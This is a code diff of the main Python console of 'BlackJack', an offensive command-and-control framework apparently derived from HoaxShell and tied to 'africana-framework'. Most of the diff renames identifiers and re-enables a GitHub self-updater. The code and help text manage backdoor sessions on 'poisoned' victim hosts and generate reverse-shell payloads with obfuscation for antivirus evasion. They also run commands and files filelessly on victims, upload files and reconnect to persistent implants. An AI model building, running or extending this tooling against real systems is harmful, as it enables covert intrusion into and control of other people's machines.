@@ -2,41 +2,42 @@
 #
 # Author: Rojahs Montari (r0jahsm0ntar1) 
 #
-# This script is part of the Blackjack framework: 
-# https://github.com/r0jahsm0ntar1/africana-framework
+# This script is part of the BlackJack framework: 
+# https://github.com/r0jahsm0ntar1/BlackJack
 
 
 import argparse
 from subprocess import check_output
 from Core.common import *
-from Core.settings import Blackjack_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
+from Core.settings import Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
 from Core.logging import clear_metadata
 from hashlib import md5
 from requests import get as requests_get
+from requests.exceptions import ReadTimeout
 
 # -------------- Arguments -------------- #
 parser = argparse.ArgumentParser()
 
 parser.add_argument("-p", "--port", action="store", help = "Team server port (default: 6501).", type = int)
-parser.add_argument("-x", "--blackjack-port", action="store", help = "BlackJack server port (default: 8080 via http, 443 via https).", type = int)
+parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
 parser.add_argument("-n", "--netcat-port", action="store", help = "Netcat multi-listener port (default: 4443).", type = int)
 parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http file smuggler server port (default: 8888).", type = int)
-parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Blackjack client (sibling server) to connect to your instance without prompting you for verification.")
-parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for BlackJack https server).")
-parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for BlackJack https server).")
-parser.add_argument("-s", "--skip-update", action="store_true", help = "Do not check for updates on startup.")
+parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any BlackJack client (sibling server) to connect to your instance without prompting you for verification.")
+parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
+parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
+parser.add_argument("-u", "--update", action="store_true", help = "Try to fetch the latest commits from the main branch on GitHub.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
 args = parser.parse_args()
 
 # Parse the bind ports of servers & listeners
-Blackjack_Settings.certfile = args.certfile
-Blackjack_Settings.keyfile = args.keyfile
-Blackjack_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
-Blackjack_Settings.bind_port = args.blackjack_port if args.blackjack_port else Blackjack_Settings.bind_port
+Hoaxshell_Settings.certfile = args.certfile
+Hoaxshell_Settings.keyfile = args.keyfile
+Hoaxshell_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
+Hoaxshell_Settings.bind_port = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port
 
-if Blackjack_Settings.ssl_support:
-    Blackjack_Settings.bind_port_ssl = args.blackjack_port if args.blackjack_port else Blackjack_Settings.bind_port_ssl
+if Hoaxshell_Settings.ssl_support:
+    Hoaxshell_Settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port_ssl
 
 Core_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port
 TCP_Sock_Handler_Settings.bind_port = args.netcat_port if args.netcat_port else TCP_Sock_Handler_Settings.bind_port
@@ -45,10 +46,10 @@ File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler
 # Check if there are port number conflicts
 defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]
 
-if Blackjack_Settings.ssl_support:
-    defined_ports.append(Blackjack_Settings.bind_port_ssl)
+if Hoaxshell_Settings.ssl_support:
+    defined_ports.append(Hoaxshell_Settings.bind_port_ssl)
 else:
-    defined_ports.append(Blackjack_Settings.bind_port)
+    defined_ports.append(Hoaxshell_Settings.bind_port)
 
 if check_list_for_duplicates(defined_ports):
     exit(f'[{DEBUG}] The port number of each server/handler must be different.')
@@ -62,7 +63,7 @@ from Core.blackjack_core import *
 
 # -------------- Functions & Classes -------------- #
 
-def africs_print(text, leading_spaces = 0):
+def haxor_print(text, leading_spaces = 0):
 
     text_chars = list(text)
     current, mutated = '', ''
@@ -82,9 +83,6 @@ def africs_print(text, leading_spaces = 0):
 
 
 def print_banner():
-    
-    print('\r')
-def print_banner():
     os.system('clear')
     print(fr'''{BLUE}
 
@@ -97,26 +95,26 @@ def print_banner():
               /    |  \  |    \
            .-' ,-''|   ; |''-, '-.
                |   |    \|   |
-               |   |    ;|   |
+               |   |    ;|   |           {RED}v2.0.7{BLUE}
                |   \    //   |      {YELLOW}Jesus Christ is{BLUE}
                |    '._//'   |  {GREEN}The Lamb that was slain{BLUE}
-              .'             '.     {GREEN}sfor our sins.{BLUE}
+              .'             '.      {GREEN}for our sins.{BLUE}
            _,'                 ',_     {PURPLE}John 3:16{GREEN}
 
 ''')
 
-
-
 def print_meta():
-    print(f'{BLUE}  ~>( {END}blackjack C3 - Part of africana-framework {BLUE})<~{END}\n')
+    print(f'{BLUE}   ~>( {END}blackjack C3 - Part of africana-framework{BLUE} )<~{END}\n')
+    print(f'{META} Created by r0jahsm0ntar1')
+    print(f'{META} Follow on GitHub, HTB, X, YT: @r0jahsm0ntar1')
 
 class PrompHelp:
     
     commands = {
     
         'connect' : {
-            'details' : f'''
-Connect with another instance of Blackjack (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Blackjack instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list Blackjack related services info. Read the Usage Guide or check my YouTube channel (@RojahsMontari) for details.
+            'details' : f'''             
+Connect with another instance of BlackJack (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a BlackJack instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list BlackJack related services info. Read the Usage Guide or check my YouTube channel (@HaxorTechTones) for details.
 
 connect <IP> <TEAM_SERVER_PORT>''',
             'least_args' : 2,
@@ -126,18 +124,18 @@ connect <IP> <TEAM_SERVER_PORT>''',
                 
         'generate' : {
             'details' : f'''         
-Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Blackjack/Core/payload_templates and edit or create your own.
+Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in BlackJack/Core/payload_templates and edit or create your own.
 
 Main logic:
 generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
 
 Usage examples:
 generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
-generate payload=linux/blackjack/sh_curl lhost=eth0
+generate payload=linux/hoaxshell/sh_curl lhost=eth0
 
 - The ENCODE and OBFUSCATE attributes are enabled for certain templates and can be used during payload generation. 
 - For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
-- To catch BlackJack https-based reverse shells you need to start Blackjack with SSL.
+- To catch HoaxShell https-based reverse shells you need to start BlackJack with SSL.
 - Ultimately, one should edit the templates and add obfuscated versions of the commands for AV evasion.''',
             'least_args' : 0, # Intentionally set to 0 so that the Payload_Generator class can inform users about missing arguments
             'max_args' : 7
@@ -158,7 +156,7 @@ exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>
 
         'repair' : {
             'details' : f'''             
-Use this command to manually correct a backdoor session's hostname/username value, in case Blackjack does not interpret the information correctly when the session is established.
+Use this command to manually correct a backdoor session's hostname/username value, in case BlackJack does not interpret the information correctly when the session is established.
      
 repair <SESSION ID or ALIAS> <HOSTNAME or USERNAME> <NEW VALUE>''',
             'least_args' : 3,
@@ -214,14 +212,14 @@ kill <SESSION ID or ALIAS>''',
         'siblings' : {
             'details' : f'''
 Print info about connected Sibling Servers. 
-Siblings are basically other instances of Blackjack that you are connected with.''',
+Siblings are basically other instances of BlackJack that you are connected with.''',
             'least_args' : 0,
             'max_args' : 0
         },
 
         'threads' : {
             'details' : f'''
-Blackjack creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file Blackjack/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by Blackjack, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
+BlackJack creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file BlackJack/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by BlackJack, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
   
 Note that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0.''',
             'least_args' : 0,
@@ -241,7 +239,7 @@ Note that, if the thread limiter reaches 0, weird things will start happening as
         },
 
         'sockets' : {
-            'details' : f'''Prints Blackjack related socket services info.''',
+            'details' : f'''Prints BlackJack related socket services info.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -254,7 +252,7 @@ Note that, if the thread limiter reaches 0, weird things will start happening as
 
         'upload' : {
             'details' : f'''
-Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Blackjack's main prompt as well as the pseudo shell terminal.
+Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from BlackJack's main prompt as well as the pseudo shell terminal.
 
 From the main prompt:
 upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH> <SESSION ID or ALIAS>
@@ -267,7 +265,7 @@ upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>''',
 
         'cmdinspector' : {
             'details' : f'''
-Blackjack has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
+BlackJack has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
 Use the cmdinspector command to turn that feature on/off. 
 
 cmdinspector <ON / OFF>''',
@@ -293,7 +291,7 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
         },
 
         'flee' : {
-            'details' : f'''Quit without terminating active sessions. When you start Blackjack again, if any BlackJack implant is still running on previously injected hosts, the session(s) will be re-established.''',
+            'details' : f'''Quit without terminating active sessions. When you start BlackJack again, if any HoaxShell implant is still running on previously injected hosts, the session(s) will be re-established.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -305,7 +303,7 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
         },
 
         'purge' : {
-            'details' : f'''Blackjack automatically stores information regarding generated implants and loads them in memory every time it starts. This way, BlackJack generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
+            'details' : f'''BlackJack automatically stores information regarding generated implants and loads them in memory every time it starts. This way, HoaxShell generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -318,42 +316,43 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
                 
         print(
         f'''
-        \r  Command              Description
+        \r  {ORANGE}Command              {RED}Description{END}
         \r  -------              -----------
-        \r  help         [+]     Print this message.
-        \r  connect      [+]     Connect with a sibling server.
-        \r  generate     [+]     Generate backdoor payload.
-        \r  siblings             Print sibling servers data table.
-        \r  sessions             Print established backdoor sessions data table.
-        \r  backdoors            Print established backdoor types data table.
-        \r  sockets              Print Blackjack related running services' info.
-        \r  shell        [+]     Enable an interactive pseudo-shell for a session.
-        \r  exec         [+]     Execute command/file against a session.
-        \r  upload       [+]     Upload files to a backdoor session.
-        \r  alias        [+]     Set an alias for a shell session.
-        \r  reset        [+]     Reset alias back to the session's unique ID.
-        \r  kill         [+]     Terminate an established backdoor session.
-        \r  conptyshell  [+]     Slap Invoke-ConPtyShell against a backdoor session.
-        \r  repair       [+]     Manually correct a session's hostname/username info.
-        \r  id                   Print server's unique ID (Self).
-        \r  cmdinspector [+]     Turn Session Defender on/off.
-        \r  threads              Print information regarding active threads.
-        \r  clear                Clear screen.
-        \r  purge                Delete all stored sessions metadata.
-        \r  flee                 Quit without terminating active sessions.
-        \r  exit                 Kill all sessions and quit.
+        \r  {BLUE}help{END}         [+]     Print this message.
+        \r  {BLUE}connect{END}      [+]     Connect with a sibling server.
+        \r  {BLUE}generate{END}     [+]     Generate backdoor payload.
+        \r  {BLUE}siblings{END}             Print sibling servers data table.
+        \r  {BLUE}sessions{END}             Print established backdoor sessions data table.
+        \r  {BLUE}backdoors{END}            Print established backdoor types data table.
+        \r  {BLUE}sockets{END}              Print Blackjack related running services' info.
+        \r  {BLUE}shell{END}        [+]     Enable an interactive pseudo-shell for a session.
+        \r  {BLUE}exec{END}         [+]     Execute command/file against a session.
+        \r  {BLUE}upload{END}       [+]     Upload files to a backdoor session.
+        \r  {BLUE}alias{END}        [+]     Set an alias for a shell session.
+        \r  {BLUE}reset{END}        [+]     Reset alias back to the session's unique ID.
+        \r  {BLUE}kill{END}         [+]     Terminate an established backdoor session.
+        \r  {BLUE}conptyshell{END}  [+]     Slap Invoke-ConPtyShell against a backdoor session.
+        \r  {BLUE}repair{END}       [+]     Manually correct a session's hostname/username info.
+        \r  {BLUE}id{END}                   Print server's unique ID (Self).
+        \r  {BLUE}cmdinspector{END} [+]     Turn Session Defender on/off.
+        \r  {BLUE}threads{END}              Print information regarding active threads.
+        \r  {BLUE}clear{END}                Clear screen.
+        \r  {BLUE}purge{END}                Delete all stored sessions metadata.
+        \r  {BLUE}flee{END}                 Quit without terminating active sessions.
+        \r  {BLUE}exit{END}                 Kill all sessions and quit.
         \r  
-        \r  Commands starting with "#" are interpreted as messages and will be 
-        \r  broadcasted to all connected Sibling Servers (chat).
+        \r  {DGREEN}Commands{END} starting with {RED}"#"{END} are interpreted as messages and will be {END}
+        \r  broadcasted to all connected Sibling Servers {GREEN}(chat).{END}
         \r
-        \r  Commands with [+] may require additional arguments.
+        \r  {DGREEN}Commands{END} with {BLUE}[{END}+{BLUE}]{END} may require additional arguments.
         \r  For details use: {ORANGE}help <COMMAND>{END}
         ''')
 
     @staticmethod
-    def print_detailed(cmd):
+    def print_detailed(cmd):            
         PrompHelp.print_justified(PrompHelp.commands[cmd]['details'].strip()) if cmd in PrompHelp.commands.keys() \
         else print(f'No details for command "{cmd}".')
+
 
     @staticmethod
     def print_justified(text):
@@ -449,17 +448,21 @@ def alias_sanitizer(word, _min = 2, _max = 26):
 
 
     
-# Tab Auto-Completer
+# Tab Auto-Completer          
 class Completer(object):
     
     def __init__(self):
-        self.tab_counter = 0 
+        
+        self.tab_counter = 0        
         self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
-        self.generate_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
+        self.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
         'exec_outfile', 'domain']
+        self.pseudo_shell_commands = ['upload', 'cmdinspector']
         self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
-
-    def reset_counter(self):
+    
+    
+    
+    def reset_counter(self):    
         sleep(0.4)
         self.tab_counter = 0
         
@@ -511,7 +514,7 @@ class Completer(object):
                     else:                        
                         print('\n')
                         print_columns(matches)
-                        Main_prompt.rst_prompt()
+                        Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
                         return False 
                 
                 elif len(unique) == 1:
@@ -589,7 +592,7 @@ class Completer(object):
                 print('\n')    
                 print_columns(match)
                 self.tab_counter = 0
-                Main_prompt.rst_prompt()
+                Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 
                 
 
@@ -616,15 +619,14 @@ class Completer(object):
         main_cmd = line_buffer_list[0].lower()
         
         # Get prompt command from word fragment
+        # print(f'{line_buffer_list_len} - {Main_prompt.ready}  - {main_cmd}')
         if line_buffer_list_len == 1:
-                    
-            match = self.get_match_from_list(main_cmd, self.main_prompt_commands)
+            match = self.get_match_from_list(main_cmd, self.main_prompt_commands if Main_prompt.ready else self.pseudo_shell_commands)
             self.update_prompt(len(line_buffer_list[0]), match) if match else chill()
-        
-        
+
+    
         # Autocomplete session IDs
-        elif (main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell']) and \
-            (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
+        elif ((main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
             
             if line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):
                 pass
@@ -666,22 +668,25 @@ class Completer(object):
         elif (main_cmd == 'generate') and (line_buffer_list_len > 1):
                                     
             word_frag = line_buffer_list[-1].lower()
-
-            if re.search('payload=[\w\/\\\]{0,}', word_frag):
+            if re.search('payload=[\\w\\/\\\\]{0,}', word_frag):
                 
                 tmp = word_frag.split('=')
+                root = self.payload_templates_root    
 
-                if tmp[1]:
-
-                    root = self.payload_templates_root            
+                if tmp[1]:                    
                     search_term = tmp[1]
                     self.path_autocompleter(root, search_term, hide_py_extensions = True)
 
-                else:
-                    pass
+                elif self.tab_counter > 1:
+                    contents = os.listdir(root)
+                    directories = [f'{entry}/' for entry in contents if os.path.isdir(os.path.join(root, entry))]
+                    print('\n')    
+                    print_columns(directories)
+                    self.tab_counter = 0
+                    Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 
             else:
-                match = self.get_match_from_list(line_buffer_list[-1], self.generate_arguments)
+                match = self.get_match_from_list(line_buffer_list[-1], self.main_command_arguments)
                 self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()
 
 
@@ -713,100 +718,106 @@ def main():
     current_wd = os.path.dirname(os.path.abspath(__file__))
     
     # Check for updates
-#    if not args.skip_update:
-#        
-#        try:
-#            local_files_path = current_wd + os.sep
-#            branch = 'main' 
-#            url = f'https://api.github.com/repos/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/git/trees/{branch}?recursive=1'
-#            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/{branch}/'
-#            Loading.active = True
-#            loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
+    if args.update:
+        
+        try:
+            local_files_path = current_wd + os.sep
+            branch = 'main' 
+            url = f'https://api.github.com/repos/r0jahsm0ntar1/BlackJack/git/trees/{branch}?recursive=1'
+            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/BlackJack/{branch}/'        
+            Loading.active = True
+            Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
 
             
-#            def get_local_file_hash(filename):
-#                
-#                try:
-#                    with open(local_files_path + filename, 'rb') as f:
-#                        data = f.read()
-#                        return md5(data).hexdigest()
-#                        
-#                except FileNotFoundError:
-#                    return False
-#        
-#        
-#            def update_file(filename, data):
-#        
-#                try:
-#                    with open(local_files_path + filename, 'wb') as f:
-#                        f.write(data)
-#                        return True
-#                        
-#                except:
-#                    return False
-#        
-       
-#            try:
-#                response = requests_get(url = url, timeout=(5, 27))
-#                response.raise_for_status()  # raises stored HTTPError, if one occurred
-#                res_status_code = response.status_code
-#                
-#            #except requests.exceptions.HTTPError as e:
-#                #print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
-#                
-#            except Exception as e:
-#                res_status_code = -1
-#                Loading.stop()
-#                print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
-#        
-#        
-#            if res_status_code == 200:
-#                
-#                files = [file['path'] for file in response.json()['tree'] if file['type'] == 'blob']
-#                update_consent = False
-#                
-#                for filename in files:
-#                    file_data = requests_get(url = raw_url + filename, timeout=(5, 27))
-#                    latest_signature = md5(file_data.content).hexdigest()
-#                    local_signature = get_local_file_hash(filename)
-#                    
-#                    if not local_signature or (local_signature != latest_signature):
-#                        Loading.stop()
-#                        
-#                        if not update_consent:                
-#                            consent = input(f'\r[{INFO}] Updates detected. Would you like to proceed? [y/n]: ').lower().strip()
-#        
-#                            if consent in ['y', 'yes']:
-#                                update_consent = True
-#                                Loading.active = True
-#                                loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Updating',), name = 'loading_animation', daemon = True).start()
-#                            else:
-#                                break
-#                            
-#                        if update_consent:
-#                            updated = update_file(filename, file_data.content)
-#                            
-#                            if not updated:
-#                                Loading.stop()
-#                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Blackjack.')
-#                                exit(1)
-#                                
-#                if update_consent:
-#                    Loading.stop()
-#                    print(f'\r[{INFO}] Update completed!')
-#                    os.execv(sys.executable, ['python3'] + sys.argv + ['-q'] + ['-s'])
-#                else:
-#                    Loading.stop(print_nl = True)    
-#            else:
-#                Loading.stop(print_nl = True)
-#                
-#        except KeyboardInterrupt:
-#            Loading.stop(print_nl = True)
-#            pass
+            def get_local_file_hash(filename):
+                
+                try:
+                    with open(local_files_path + filename, 'rb') as f:
+                        data = f.read()
+                        return md5(data).hexdigest()
+                        
+                except FileNotFoundError:
+                    return False
+        
+        
+            def update_file(filename, data):
+        
+                try:
+                    with open(local_files_path + filename, 'wb') as f:
+                        f.write(data)
+                        return True
+                        
+                except:
+                    return False
+        
+        
+            try:
+                response = requests_get(url = url, timeout=(5, 27))
+                response.raise_for_status()  # raises stored HTTPError, if one occurred
+                res_status_code = response.status_code
+                
+            #except requests.exceptions.HTTPError as e:
+                #print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
+
+            except Exception as e:
+                res_status_code = -1
+                Loading.stop()
+                print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
+        
+        
+            if res_status_code == 200:
+                
+                files = [file['path'] for file in response.json()['tree'] if file['type'] == 'blob']
+                update_consent = False
+                
+                for filename in files:
+                    try:
+                        file_data = requests_get(url = raw_url + filename, timeout=(5, 29))
+                    except:
+                        # Temporary dirty solution
+                        print(f'\r[{ERR}] Failed to fetch file: {filename}. Installation may be corrupt. Consider reinstalling BlackJack.')
+                        raise KeyboardInterrupt
+                        
+                    latest_signature = md5(file_data.content).hexdigest()
+                    local_signature = get_local_file_hash(filename)
+                    
+                    if not local_signature or (local_signature != latest_signature):
+                        Loading.stop()
+                        
+                        if not update_consent:                
+                            consent = input(f'\r[{INFO}] Updates detected. Would you like to proceed? [y/n]: ').lower().strip()
+        
+                            if consent in ['y', 'yes']:
+                                update_consent = True
+                                Loading.active = True
+                                loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Updating',), name = 'loading_animation', daemon = True).start()
+                            else:
+                                break
+                            
+                        if update_consent:
+                            updated = update_file(filename, file_data.content)
+                            
+                            if not updated:
+                                Loading.stop()
+                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling BlackJack.')
+                                exit(1)
+                                
+                if update_consent:
+                    Loading.stop()
+                    print(f'\r[{INFO}] Update completed!')
+                    os.execv(sys.executable, ['python3'] + sys.argv + ['-q'] + ['-s'])
+                else:
+                    Loading.stop(print_nl = True)    
+            else:
+                Loading.stop(print_nl = True)
+                
+        except KeyboardInterrupt:
+            Loading.stop(print_nl = True)
+            pass
             
     # Initialize essential services
-    print(f'{BLUE}        ~>({END} Initializing required services {BLUE})<~{END}\n')
-    #print_meta()
+    #print(f'[{INFO}] Initializing required services:\n')
+    print(f'{BLUE}     ~>( {END}{DARKGREY}{ITALIC}blackjack C3 - Part of africana-framework {BLUE})<~{END}\n')
 
     ''' Init Core '''
     core = Core_Server()
@@ -842,7 +853,7 @@ def main():
 
         if netcat.listener_initialized:
             break
-
+        
         elif netcat.listener_initialized == False:
             sys.exit(1)
             
@@ -850,11 +861,11 @@ def main():
         sys.exit(1)
     
     
-    ''' Init Blackjack Engine '''
-    initiate_blackjack_server()
+    ''' Init Hoaxshell Engine '''
+    initiate_hoax_server()
     payload_engine = Payload_Generator()
     sessions_manager = Sessions_Manager()
-    Blackjack.server_unique_id = core.return_server_uniq_id()
+    Hoaxshell.server_unique_id = core.return_server_uniq_id()
 
 
     ''' Init File Smuggler '''
@@ -889,7 +900,7 @@ def main():
 
             try:
                 Core_Server.announce_server_shutdown()
-                Blackjack.terminate() if not flee else do_nothing()
+                Hoaxshell.terminate() if not flee else do_nothing()
                 core.stop_listener()
 
             except:
@@ -902,16 +913,14 @@ def main():
 
         return
 
-
-
     ''' Start tab autoComplete '''
     comp = Completer()
     global_readline.set_completer_delims(' \t\n;')
     global_readline.parse_and_bind("tab: complete")
     global_readline.set_completer(comp.complete)
 
-    print(f'[{INFO}] Welcome! Type "help" to list available commands.\n')
-    
+    print(f'{BLUE}({GREEN}africana{BLUE}) {ITALIC}{RED}Welcome! {END}Type {ORANGE}"help" {END}{DARKGREY}{ITALIC}to list available commands.{END}\n')
+
     ''' +---------[ Command prompt ]---------+ '''
     while True:
         
@@ -938,8 +947,8 @@ def main():
 
 
                 # Handle single/double quoted arguments
-                quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
-                quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
+                quoted_args_single = re.findall("'{1}[\\s\\S]*'{1}", user_input)
+                quoted_args_double = re.findall('"{1}[\\s\\S]*"{1}', user_input)
                 quoted_args = quoted_args_single + quoted_args_double
                 
                 if len(quoted_args):
@@ -964,13 +973,12 @@ def main():
                     continue
                 
                 # Validate number of args
-                valid = PrompHelp.validate(cmd, (cmd_list_len - 1))                
-                                    
+                valid = PrompHelp.validate(cmd, (cmd_list_len - 1))
                 if not valid:
                     continue
 
 
-                if cmd == 'help':                    
+                if cmd == 'help':
                     if cmd_list_len == 1:
                         PrompHelp.print_main_help_msg()
                                         
@@ -1017,6 +1025,15 @@ def main():
                             execution_object = cmd_list[1]
                             session_id = cmd_list[2]
                             is_file = False
+
+                            # Check if session id has alias
+                            session_id = sessions_manager.alias_to_session_id(session_id)
+                            
+                            if not session_id:
+                                print(f'\r[{ERR}] Failed to interpret session_id.')
+                                Main_prompt.ready = True
+                                continue    
+                            
                             shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
                             
                             if execution_object[0] in [os.sep, '~']:
@@ -1053,15 +1070,7 @@ def main():
                                 if dangerous_input_detected:
                                     Session_Defender.print_warning()
                                     Main_prompt.ready = True
-                                    continue    
-
-                            # Check if session id has alias
-                            session_id = sessions_manager.alias_to_session_id(session_id)
-                            
-                            if not session_id:
-                                print(f'\r[{ERR}] Failed to interpret session_id.')
-                                Main_prompt.ready = True
-                                continue                                
+                                    continue                                
                             
                             # If file, check if shell type is supported for exec
                             if shell_type not in ['unix', 'powershell.exe']:
@@ -1091,7 +1100,7 @@ def main():
                                     
                                     if session_owner_id == core.return_server_uniq_id():
                                         File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
-                                            else Blackjack.command_pool[session_id].append(execution_object)
+                                            else Hoaxshell.command_pool[session_id].append(execution_object)
                                     
                                     else:
                                         core.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \
@@ -1134,7 +1143,7 @@ def main():
 
                         if not shell_occupied:                    
                             os_type = sessions_manager.active_sessions[session_id]['OS Type']
-                            Blackjack.activate_pseudo_shell_session(session_id, os_type)
+                            Hoaxshell.activate_pseudo_shell_session(session_id, os_type)
                             
                         else:
                             print(f'\r[{INFO}] This session is currently being used by a sibling server.')
@@ -1190,7 +1199,9 @@ def main():
                         else:
                             print('Invalid session ID.')
                     else:
-                        print(f'\rNo active sessions.')
+                        print(f'\rNo active sessions.')        
+
+
 
                 elif cmd == 'repair':
 
@@ -1216,15 +1227,20 @@ def main():
                                 
                             elif result == 0:
                                 print('Success.')
+                            
                         else:
                             print(f'Repair function not applicable on "{key}". Try HOSTNAME or USERNAME.')
+
                     else:
-                        print(sessions_check[1])
+                        print(sessions_check[1])                            
+
+
 
                 elif cmd == 'reset':
-                    alias = cmd_list[1]
-                    sid = Sessions_Manager.alias_to_session_id(alias)
 
+                    alias = cmd_list[1]                    
+                    sid = Sessions_Manager.alias_to_session_id(alias)
+                    
                     if sid == alias:
                         print('Unrecognized alias.')
                     
@@ -1233,34 +1249,56 @@ def main():
                         Sessions_Manager.active_sessions[sid]['alias'] = None
                         Sessions_Manager.aliases.remove(alias)
                         print(f'Alias for session {sid} successfully reset.')
-
+                        
                     else:
                         print('Unrecognized alias.')
 
+
+
                 elif cmd == 'clear':
                     os.system('clear')
+
+
+
                 elif cmd == 'flee':
                     blackjack_out(flee = True)
+
+
+
                 elif cmd == 'exit':
                     raise KeyboardInterrupt
+
                 elif cmd == 'sessions':
                     sessions_manager.list_sessions()
+
+
+
                 elif cmd == 'backdoors':
                     sessions_manager.list_backdoors()
-                elif cmd == 'sockets':
+
+
+
+                elif cmd == 'sockets':    
                     print_running_services_info()
 
-                elif cmd == 'siblings':
+
+
+                elif cmd == 'siblings':                                        
                     core.list_siblings()
-                elif cmd == 'threads':
+
+
+
+                elif cmd == 'threads':                                        
                     print(f'\nThread limiter value: {Threading_params.thread_limiter._value}')
                     threads = enumerate_threads()
                     thread_names = []
+
